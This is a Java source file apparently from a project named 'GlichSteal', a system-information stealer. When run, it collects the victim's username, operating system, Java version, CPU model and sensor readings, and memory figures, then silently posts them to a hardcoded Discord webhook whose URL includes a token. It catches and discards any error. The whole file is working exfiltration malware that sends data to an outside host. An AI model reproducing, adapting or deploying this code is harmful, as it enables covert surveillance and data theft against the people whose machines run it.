package com.glichsteal;

import com.glichsteal.utility.DiscordWebhook;

import java.awt.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.GlobalMemory;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.hardware.Sensors;
import oshi.software.os.OperatingSystem;

/*
    github: https://github.com/histed1488/GlichSteal
 */
public class Main {
    private static DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1247923425406881823/WJDikkY2gGYebuu7JNSb9rB2-tSLEMr3LVu8QdrpsH__4bITA3UHoncGvtfa4EhBOrwo");

    public static String Enter = "\\n";
    // java
    static String osName = System.getProperty("os.name");
    public static String userName = System.getProperty("user.name");
    public static String javaVersion = System.getProperty("java.version");

    // oshi lib
    public static SystemInfo systemInfo = new SystemInfo();
    public static HardwareAbstractionLayer hal = systemInfo.getHardware();
    public static OperatingSystem os = systemInfo.getOperatingSystem();
    public static Sensors sensors = systemInfo.getHardware().getSensors();
    public static GlobalMemory memory = systemInfo.getHardware().getMemory();
    public static CentralProcessor processor = hal.getProcessor();




    public static void main(String[] args) {
        DiscordWebhook.EmbedObject embedObject = getEmbedObject();
        webhook.addEmbed(embedObject);
        try {
            webhook.execute();
        } catch (IOException e) {}
    }

    private static DiscordWebhook.EmbedObject getEmbedObject() {

        DiscordWebhook.EmbedObject embedObject = new DiscordWebhook.EmbedObject();

        java.util.Date date = new java.util.Date();

        webhook.setContent("```✨ GlichSteal - " + Enter +
                "⌛ Date / Time: " + String.valueOf(date) + Enter +
                "💻 System: " + osName +  Enter +
                "👤 Username: " + userName + Enter +
                "🛠️ Java Version: " + javaVersion + Enter +
                "✨ Sensors - " + Enter +
                "🔗 CPU temperature: " +  sensors.getCpuTemperature() + " °C" + Enter +
                "📡 Fan speed: " + sensors.getFanSpeeds() + Enter +
                "🛠️ CPU voltage: " + sensors.getCpuVoltage() + " V" + Enter +
                "✨ Disks - " + Enter +
                "💻 Total weight: " + memory.getTotal() + " byte" + Enter +
                "⌛ Available: " + memory.getAvailable() + " byte" + Enter +
                "✨ CPU - " + Enter +
                "💻 Model: " + processor.getProcessorIdentifier().getName() + " byte" + Enter +
                "🛠️ Number of cores: " + processor.getPhysicalProcessorCount() + Enter +
                "```");
        embedObject.addField("Github", "https://github.com/histed1488/GlichSteal", true);
        embedObject.setColor(new Color(255, 255, 255, 255));
        return embedObject;
    }

    public static void getName() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();

            String hostName = localHost.getHostName();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }
}